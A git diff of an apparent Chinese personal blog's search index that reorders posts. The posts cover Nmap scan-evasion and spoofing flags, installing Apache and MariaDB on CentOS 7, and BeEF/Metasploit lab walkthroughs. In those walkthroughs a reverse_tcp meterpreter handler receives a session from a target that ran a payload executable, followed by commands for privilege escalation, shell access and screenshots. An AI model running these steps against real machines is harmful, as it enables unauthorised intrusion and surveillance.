@@ -11,28 +11,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Nmap简单使用</title>
-    <url>/2021/11/24/Nmap%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<h2 id="Nmap简单使用"><a href="#Nmap简单使用" class="headerlink" title="Nmap简单使用"></a>Nmap简单使用</h2><h3 id="躲避防火墙，分组发送报文"><a href="#躲避防火墙，分组发送报文" class="headerlink" title="躲避防火墙，分组发送报文"></a>躲避防火墙，分组发送报文</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -f -v 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<h3 id="设定最大传输单元，必须是8的倍数"><a href="#设定最大传输单元，必须是8的倍数" class="headerlink" title="设定最大传输单元，必须是8的倍数"></a>设定最大传输单元，必须是8的倍数</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --mtu 16 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<h3 id="指定多个诱饵"><a href="#指定多个诱饵" class="headerlink" title="指定多个诱饵"></a>指定多个诱饵</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -D 192.168.61.130 ME 127.0.0.1  #(ME 后面接目标地址)</span><br></pre></td></tr></table></figure>
-
-<h3 id="源地址欺骗"><a href="#源地址欺骗" class="headerlink" title="源地址欺骗"></a>源地址欺骗</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">namp -sI www.baidu.com:80 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<h3 id="源端口欺骗"><a href="#源端口欺骗" class="headerlink" title="源端口欺骗"></a>源端口欺骗</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --source-port 88 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<h3 id="根据发包长度（tcp是40字节，icmp溢出是28字节）"><a href="#根据发包长度（tcp是40字节，icmp溢出是28字节）" class="headerlink" title="根据发包长度（tcp是40字节，icmp溢出是28字节）"></a>根据发包长度（tcp是40字节，icmp溢出是28字节）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --data-length 30 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<h3 id="MAC地址欺骗"><a href="#MAC地址欺骗" class="headerlink" title="MAC地址欺骗"></a>MAC地址欺骗</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sT -PN --spoof-mac 0 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>nmap</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Typora简单语法</title>
     <url>/2021/11/24/Typora%E7%AE%80%E5%8D%95%E8%AF%AD%E6%B3%95/</url>
     <content><![CDATA[<h2 id="Typora简单语法"><a href="#Typora简单语法" class="headerlink" title="Typora简单语法"></a>Typora简单语法</h2><p>​        typora是一款极致简洁的markdown文本编辑器，支持即时渲染技术，是编写markdown的好手，非常的好用。</p>
@@ -105,6 +83,52 @@
       </tags>
   </entry>
   <entry>
+    <title>Nmap简单使用</title>
+    <url>/2021/11/24/Nmap%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<h2 id="Nmap简单使用"><a href="#Nmap简单使用" class="headerlink" title="Nmap简单使用"></a>Nmap简单使用</h2><h3 id="躲避防火墙，分组发送报文"><a href="#躲避防火墙，分组发送报文" class="headerlink" title="躲避防火墙，分组发送报文"></a>躲避防火墙，分组发送报文</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -f -v 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="设定最大传输单元，必须是8的倍数"><a href="#设定最大传输单元，必须是8的倍数" class="headerlink" title="设定最大传输单元，必须是8的倍数"></a>设定最大传输单元，必须是8的倍数</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --mtu 16 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="指定多个诱饵"><a href="#指定多个诱饵" class="headerlink" title="指定多个诱饵"></a>指定多个诱饵</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -D 192.168.61.130 ME 127.0.0.1  #(ME 后面接目标地址)</span><br></pre></td></tr></table></figure>
+
+<h3 id="源地址欺骗"><a href="#源地址欺骗" class="headerlink" title="源地址欺骗"></a>源地址欺骗</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">namp -sI www.baidu.com:80 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="源端口欺骗"><a href="#源端口欺骗" class="headerlink" title="源端口欺骗"></a>源端口欺骗</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --source-port 88 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="根据发包长度（tcp是40字节，icmp溢出是28字节）"><a href="#根据发包长度（tcp是40字节，icmp溢出是28字节）" class="headerlink" title="根据发包长度（tcp是40字节，icmp溢出是28字节）"></a>根据发包长度（tcp是40字节，icmp溢出是28字节）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --data-length 30 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="MAC地址欺骗"><a href="#MAC地址欺骗" class="headerlink" title="MAC地址欺骗"></a>MAC地址欺骗</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sT -PN --spoof-mac 0 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>nmap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>centos7安装apache</title>
+    <url>/2021/11/24/centos7%E5%AE%89%E8%A3%85apache/</url>
+    <content><![CDATA[<h2 id="centos7-安装Apache"><a href="#centos7-安装Apache" class="headerlink" title="centos7 安装Apache"></a>centos7 安装Apache</h2><h3 id="实验准备：vmware上安装的centos7"><a href="#实验准备：vmware上安装的centos7" class="headerlink" title="实验准备：vmware上安装的centos7"></a>实验准备：vmware上安装的centos7</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> uname -a</span></span><br><span class="line">Linux cn7 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> cat /etc/redhat-release</span></span><br><span class="line">CentOS Linux release 7.9.2009 (Core)</span><br></pre></td></tr></table></figure>
+
+<h3 id="安装Apache："><a href="#安装Apache：" class="headerlink" title="安装Apache："></a>安装Apache：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> yum -y install httpd</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="查看http状态："><a href="#查看http状态：" class="headerlink" title="查看http状态："></a>查看http状态：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl status httpd</span></span><br><span class="line">● httpd.service - The Apache HTTP Server</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/httpd.service; disabled; vendor preset: disabled)</span><br><span class="line">   Active: inactive (dead)</span><br><span class="line">     Docs: man:httpd(8)</span><br><span class="line">           man:apachectl(8)</span><br></pre></td></tr></table></figure>
+
+<h3 id="启动Apache并设置为开机启动："><a href="#启动Apache并设置为开机启动：" class="headerlink" title="启动Apache并设置为开机启动："></a>启动Apache并设置为开机启动：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl start httpd</span></span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl <span class="built_in">enable</span> httpd</span></span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/httpd.service to /usr/lib/systemd/system/httpd.service.</span><br></pre></td></tr></table></figure>
+
+<h3 id="再次查看Apache状态："><a href="#再次查看Apache状态：" class="headerlink" title="再次查看Apache状态："></a>再次查看Apache状态：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl status httpd</span></span><br><span class="line">● httpd.service - The Apache HTTP Server</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/httpd.service; enabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since 六 2021-08-28 21:28:05 CST; 1min 17s ago</span><br><span class="line">     Docs: man:httpd(8)</span><br><span class="line">           man:apachectl(8)</span><br><span class="line"> Main PID: 1358 (httpd)</span><br><span class="line">   Status: &quot;Total requests: 0; Current requests/sec: 0; Current traffic:   0 B/sec&quot;</span><br><span class="line">   CGroup: /system.slice/httpd.service</span><br><span class="line">           ├─1358 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           ├─1359 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           ├─1360 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           ├─1361 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           ├─1362 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           └─1363 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line"></span><br><span class="line">8月 28 21:27:34 cn7 systemd[1]: Starting The Apache HTTP Server...</span><br><span class="line">8月 28 21:27:54 cn7 httpd[1358]: AH00558: httpd: Could not reliably determine the server&#x27;s fully qualified dom...essage</span><br><span class="line">8月 28 21:28:05 cn7 systemd[1]: Started The Apache HTTP Server.</span><br><span class="line">Hint: Some lines were ellipsized, use -l to show in full.</span><br></pre></td></tr></table></figure>
+
+<h3 id="查看Apache版本"><a href="#查看Apache版本" class="headerlink" title="查看Apache版本"></a>查看Apache版本</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> httpd -v</span></span><br><span class="line">Server version: Apache/2.4.6 (CentOS)</span><br><span class="line">Server built:   Nov 16 2020 16:18:20</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用ss查看端口监听状态"><a href="#使用ss查看端口监听状态" class="headerlink" title="使用ss查看端口监听状态"></a>使用ss查看端口监听状态</h3><p>（ss -tnl     [t：tcp,n：数字显示,l：监听]）</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> ss -tnl</span></span><br><span class="line">State      Recv-Q Send-Q               Local Address:Port                              Peer Address:Port</span><br><span class="line">LISTEN     0      128                              *:22                                           *:*</span><br><span class="line">LISTEN     0      100                      127.0.0.1:25                                           *:*</span><br><span class="line">LISTEN     0      128                           [::]:22                                        [::]:*</span><br><span class="line">LISTEN     0      100                          [::1]:25                                        [::]:*</span><br><span class="line">LISTEN     0      128                           [::]:80                                        [::]:*</span><br></pre></td></tr></table></figure>
+
+<h3 id="访问虚拟机的ip地址"><a href="#访问虚拟机的ip地址" class="headerlink" title="访问虚拟机的ip地址"></a>访问虚拟机的ip地址</h3><p>如果能访问即成功。</p>
+]]></content>
+      <tags>
+        <tag>apache centos7</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>beef+metasploit利用浏览器获取shell</title>
     <url>/2021/12/20/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/</url>
     <content><![CDATA[<h2 id="beef-metasploit利用浏览器获取shell"><a href="#beef-metasploit利用浏览器获取shell" class="headerlink" title="beef+metasploit利用浏览器获取shell"></a>beef+metasploit利用浏览器获取shell</h2><h3 id="利用beef获得目标主机shell"><a href="#利用beef获得目标主机shell" class="headerlink" title="利用beef获得目标主机shell"></a>利用beef获得目标主机shell</h3><h4 id="原理：beef是一个用于合法研究和测试目的的专业浏览器漏洞利用框架。它允许有经验的渗透测试人员或系统管理员对目标进行攻击测试。攻击成功以后会加载浏览器劫持会话。BEEF可以利用XSS跨站脚本漏洞。"><a href="#原理：beef是一个用于合法研究和测试目的的专业浏览器漏洞利用框架。它允许有经验的渗透测试人员或系统管理员对目标进行攻击测试。攻击成功以后会加载浏览器劫持会话。BEEF可以利用XSS跨站脚本漏洞。" class="headerlink" title="原理：beef是一个用于合法研究和测试目的的专业浏览器漏洞利用框架。它允许有经验的渗透测试人员或系统管理员对目标进行攻击测试。攻击成功以后会加载浏览器劫持会话。BEEF可以利用XSS跨站脚本漏洞。"></a>原理：beef是一个用于合法研究和测试目的的专业浏览器漏洞利用框架。它允许有经验的渗透测试人员或系统管理员对目标进行攻击测试。攻击成功以后会加载浏览器劫持会话。BEEF可以利用XSS跨站脚本漏洞。</h4><h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>打开终端，将beef和metasploit进行关联，终端进入<code>beef-xss</code>目录，编辑文件<code>config.yaml</code></p>
@@ -156,49 +180,6 @@
       </tags>
   </entry>
   <entry>
-    <title>centos7安装apache</title>
-    <url>/2021/11/24/centos7%E5%AE%89%E8%A3%85apache/</url>
-    <content><![CDATA[<h2 id="centos7-安装Apache"><a href="#centos7-安装Apache" class="headerlink" title="centos7 安装Apache"></a>centos7 安装Apache</h2><h3 id="实验准备：vmware上安装的centos7"><a href="#实验准备：vmware上安装的centos7" class="headerlink" title="实验准备：vmware上安装的centos7"></a>实验准备：vmware上安装的centos7</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> uname -a</span></span><br><span class="line">Linux cn7 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> cat /etc/redhat-release</span></span><br><span class="line">CentOS Linux release 7.9.2009 (Core)</span><br></pre></td></tr></table></figure>
-
-<h3 id="安装Apache："><a href="#安装Apache：" class="headerlink" title="安装Apache："></a>安装Apache：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> yum -y install httpd</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="查看http状态："><a href="#查看http状态：" class="headerlink" title="查看http状态："></a>查看http状态：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl status httpd</span></span><br><span class="line">● httpd.service - The Apache HTTP Server</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/httpd.service; disabled; vendor preset: disabled)</span><br><span class="line">   Active: inactive (dead)</span><br><span class="line">     Docs: man:httpd(8)</span><br><span class="line">           man:apachectl(8)</span><br></pre></td></tr></table></figure>
-
-<h3 id="启动Apache并设置为开机启动："><a href="#启动Apache并设置为开机启动：" class="headerlink" title="启动Apache并设置为开机启动："></a>启动Apache并设置为开机启动：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl start httpd</span></span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl <span class="built_in">enable</span> httpd</span></span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/httpd.service to /usr/lib/systemd/system/httpd.service.</span><br></pre></td></tr></table></figure>
-
-<h3 id="再次查看Apache状态："><a href="#再次查看Apache状态：" class="headerlink" title="再次查看Apache状态："></a>再次查看Apache状态：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl status httpd</span></span><br><span class="line">● httpd.service - The Apache HTTP Server</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/httpd.service; enabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since 六 2021-08-28 21:28:05 CST; 1min 17s ago</span><br><span class="line">     Docs: man:httpd(8)</span><br><span class="line">           man:apachectl(8)</span><br><span class="line"> Main PID: 1358 (httpd)</span><br><span class="line">   Status: &quot;Total requests: 0; Current requests/sec: 0; Current traffic:   0 B/sec&quot;</span><br><span class="line">   CGroup: /system.slice/httpd.service</span><br><span class="line">           ├─1358 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           ├─1359 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           ├─1360 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           ├─1361 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           ├─1362 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           └─1363 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line"></span><br><span class="line">8月 28 21:27:34 cn7 systemd[1]: Starting The Apache HTTP Server...</span><br><span class="line">8月 28 21:27:54 cn7 httpd[1358]: AH00558: httpd: Could not reliably determine the server&#x27;s fully qualified dom...essage</span><br><span class="line">8月 28 21:28:05 cn7 systemd[1]: Started The Apache HTTP Server.</span><br><span class="line">Hint: Some lines were ellipsized, use -l to show in full.</span><br></pre></td></tr></table></figure>
-
-<h3 id="查看Apache版本"><a href="#查看Apache版本" class="headerlink" title="查看Apache版本"></a>查看Apache版本</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> httpd -v</span></span><br><span class="line">Server version: Apache/2.4.6 (CentOS)</span><br><span class="line">Server built:   Nov 16 2020 16:18:20</span><br></pre></td></tr></table></figure>
-
-<h3 id="使用ss查看端口监听状态"><a href="#使用ss查看端口监听状态" class="headerlink" title="使用ss查看端口监听状态"></a>使用ss查看端口监听状态</h3><p>（ss -tnl     [t：tcp,n：数字显示,l：监听]）</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> ss -tnl</span></span><br><span class="line">State      Recv-Q Send-Q               Local Address:Port                              Peer Address:Port</span><br><span class="line">LISTEN     0      128                              *:22                                           *:*</span><br><span class="line">LISTEN     0      100                      127.0.0.1:25                                           *:*</span><br><span class="line">LISTEN     0      128                           [::]:22                                        [::]:*</span><br><span class="line">LISTEN     0      100                          [::1]:25                                        [::]:*</span><br><span class="line">LISTEN     0      128                           [::]:80                                        [::]:*</span><br></pre></td></tr></table></figure>
-
-<h3 id="访问虚拟机的ip地址"><a href="#访问虚拟机的ip地址" class="headerlink" title="访问虚拟机的ip地址"></a>访问虚拟机的ip地址</h3><p>如果能访问即成功。</p>
-]]></content>
-      <tags>
-        <tag>apache centos7</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>centos7安装mariadb</title>
-    <url>/2021/11/24/centos7%E5%AE%89%E8%A3%85mariadb/</url>
-    <content><![CDATA[<h2 id="centos7安装mariadb"><a href="#centos7安装mariadb" class="headerlink" title="centos7安装mariadb"></a>centos7安装mariadb</h2><p>mariadb是MYSQL的一个分支，语法基本和mysql一样，而且兼容mysql，centos7中自带了mariadb的软件包。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> cat /etc/redhat-release</span></span><br><span class="line">CentOS Linux release 7.9.2009 (Core)</span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> uname -a</span></span><br><span class="line">Linux cn7 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>
-
-<h3 id="安装mariadb："><a href="#安装mariadb：" class="headerlink" title="安装mariadb："></a>安装mariadb：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> yum -y install mariadb-server</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="开启mariadb并设置开机启动："><a href="#开启mariadb并设置开机启动：" class="headerlink" title="开启mariadb并设置开机启动："></a>开启mariadb并设置开机启动：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl start mariadb</span></span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl <span class="built_in">enable</span> mariadb</span></span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/mariadb.service to /usr/lib/systemd/system/mariadb.service.</span><br></pre></td></tr></table></figure>
-
-<h3 id="配置数据库"><a href="#配置数据库" class="headerlink" title="配置数据库"></a>配置数据库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> mysql_secure_installation</span></span><br><span class="line">Enter current password for root (enter for none):  # 输入数据库超级管理员root的密码(注意不是系统root的密码)，第一次进入还没有设置密码则直接回车</span><br><span class="line"></span><br><span class="line">Set root password? [Y/n]  # 设置密码，y</span><br><span class="line"></span><br><span class="line">New password:  # 新密码</span><br><span class="line">Re-enter new password:  # 再次输入密码</span><br><span class="line"></span><br><span class="line">Remove anonymous users? [Y/n]  # 移除匿名用户， y</span><br><span class="line"></span><br><span class="line">Disallow root login remotely? [Y/n]  # 拒绝root远程登录，n，不管y/n，都会拒绝root远程登录</span><br><span class="line"></span><br><span class="line">Remove test database and access to it? [Y/n]  # 删除test数据库，y：删除。n：不删除，数据库中会有一个test数据库，一般不需要</span><br><span class="line"></span><br><span class="line">Reload privilege tables now? [Y/n]  # 重新加载权限表，y</span><br></pre></td></tr></table></figure>
-
-<h3 id="启动数据库"><a href="#启动数据库" class="headerlink" title="启动数据库"></a>启动数据库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> mysql -u root -p</span></span><br><span class="line">Enter password:</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 2</span><br><span class="line">Server version: 5.5.68-MariaDB MariaDB Server</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">+--------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; quit;</span><br><span class="line">Bye</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>centos7 mariadb</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>centos7安装php</title>
     <url>/2021/11/24/centos7%E5%AE%89%E8%A3%85php/</url>
     <content><![CDATA[<h2 id="centos7安装php"><a href="#centos7安装php" class="headerlink" title="centos7安装php"></a>centos7安装php</h2><p>环境是apache2+mariadb+php</p>
@@ -221,6 +202,25 @@
       </tags>
   </entry>
   <entry>
+    <title>centos7安装mariadb</title>
+    <url>/2021/11/24/centos7%E5%AE%89%E8%A3%85mariadb/</url>
+    <content><![CDATA[<h2 id="centos7安装mariadb"><a href="#centos7安装mariadb" class="headerlink" title="centos7安装mariadb"></a>centos7安装mariadb</h2><p>mariadb是MYSQL的一个分支，语法基本和mysql一样，而且兼容mysql，centos7中自带了mariadb的软件包。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> cat /etc/redhat-release</span></span><br><span class="line">CentOS Linux release 7.9.2009 (Core)</span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> uname -a</span></span><br><span class="line">Linux cn7 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>
+
+<h3 id="安装mariadb："><a href="#安装mariadb：" class="headerlink" title="安装mariadb："></a>安装mariadb：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> yum -y install mariadb-server</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="开启mariadb并设置开机启动："><a href="#开启mariadb并设置开机启动：" class="headerlink" title="开启mariadb并设置开机启动："></a>开启mariadb并设置开机启动：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl start mariadb</span></span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl <span class="built_in">enable</span> mariadb</span></span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/mariadb.service to /usr/lib/systemd/system/mariadb.service.</span><br></pre></td></tr></table></figure>
+
+<h3 id="配置数据库"><a href="#配置数据库" class="headerlink" title="配置数据库"></a>配置数据库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> mysql_secure_installation</span></span><br><span class="line">Enter current password for root (enter for none):  # 输入数据库超级管理员root的密码(注意不是系统root的密码)，第一次进入还没有设置密码则直接回车</span><br><span class="line"></span><br><span class="line">Set root password? [Y/n]  # 设置密码，y</span><br><span class="line"></span><br><span class="line">New password:  # 新密码</span><br><span class="line">Re-enter new password:  # 再次输入密码</span><br><span class="line"></span><br><span class="line">Remove anonymous users? [Y/n]  # 移除匿名用户， y</span><br><span class="line"></span><br><span class="line">Disallow root login remotely? [Y/n]  # 拒绝root远程登录，n，不管y/n，都会拒绝root远程登录</span><br><span class="line"></span><br><span class="line">Remove test database and access to it? [Y/n]  # 删除test数据库，y：删除。n：不删除，数据库中会有一个test数据库，一般不需要</span><br><span class="line"></span><br><span class="line">Reload privilege tables now? [Y/n]  # 重新加载权限表，y</span><br></pre></td></tr></table></figure>
+
+<h3 id="启动数据库"><a href="#启动数据库" class="headerlink" title="启动数据库"></a>启动数据库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> mysql -u root -p</span></span><br><span class="line">Enter password:</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 2</span><br><span class="line">Server version: 5.5.68-MariaDB MariaDB Server</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">+--------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; quit;</span><br><span class="line">Bye</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>centos7 mariadb</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>first-blog</title>
     <url>/2021/11/24/first-blog/</url>
     <content><![CDATA[<h2 id="Test-for-my-first-blog"><a href="#Test-for-my-first-blog" class="headerlink" title="Test for my first blog"></a>Test for my first blog</h2><p>这是正文。</p>
@@ -229,6 +229,34 @@
 ]]></content>
       <tags>
         <tag>test</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>metasploit之meterpreter命令</title>
+    <url>/2021/12/21/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<h2 id="metasploit之meterpreter命令"><a href="#metasploit之meterpreter命令" class="headerlink" title="metasploit之meterpreter命令"></a>metasploit之meterpreter命令</h2><h3 id="目的-了解meterpreter命令"><a href="#目的-了解meterpreter命令" class="headerlink" title="目的: 了解meterpreter命令"></a>目的: 了解meterpreter命令</h3><h3 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h3><p><code>ps</code>         查询当前目标机所有进程<br><code>getpid</code>       获取当前会话进程<br><code>getuid</code>       当前用户所用的权限，所在用户组<br><code>sysinfo</code>      取系统信息<br><code>getsystem</code>    提升至system最高权限<br><code>shell</code>      进入cmdshell命令模式<br><code>pwd</code>       查看当前所在位置<br><code>cat</code>        查看文本文件<br><code>ipconfig</code>     查看网络配置信息<br><code>migrate pid</code>   迁移pid<br><code>screenshot</code>    截取当前用户屏幕保存到本地</p>
+<h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>打开终端，运行msf，<code>use exploit/multi/handler</code>选择exploit，<code>set payload windows/meterpreter/reverse_tcp</code>设置payload，<code>set LHOST 192.168.1.2</code>设置监听主机，<code>set LPORT 11101</code>设置端口</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/1.PNG"></p>
+<p>输入<code>exploit -j</code>运行脚本，且在后台监听</p>
+<p>靶机双击桌面运行xx.exe，返回kali，已经取得会话</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/2.PNG"></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/3.PNG"></p>
+<p>敲击回车，返回msf，执行<code>sessions</code>，查看会话，再执行<code>sessions 1</code>,进入会话</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/4.PNG"></p>
+<p>执行<code>ps</code>查看进程</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/5.PNG"></p>
